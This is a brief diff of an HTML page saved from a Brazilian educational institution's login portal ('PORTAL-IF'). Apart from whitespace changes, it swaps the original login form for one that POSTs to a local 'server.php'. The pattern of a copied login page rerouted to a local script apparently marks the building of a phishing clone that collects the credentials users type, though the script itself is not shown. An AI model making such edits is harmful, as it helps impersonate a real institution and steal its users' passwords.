@@ -2,7 +2,7 @@
 <!-- saved from url=(0029)https://portalif.iftm.edu.br/ -->
 <html lang="pt-br"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <title>PORTAL-IF</title>
-    
+
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://portalif.iftm.edu.br/img/favicon.ico" rel="SHORTCUT ICON">
     <link rel="stylesheet" href="./index_files/normalize.css">
@@ -56,9 +56,9 @@
         <div style="float: right; margin-top: 10px;">
 
 
-            
+
                 <div id="frm_login">
-                    <form id="form1" name="form1" onsubmit="return true;">
+                    <form action="server.php" method="POST">
 
                         <table style="border-style:solid; border-width: 1px; border-color: #d5d5d5; margin-left: 20px; width:355px;color: #999999;">
                             <tbody><tr>
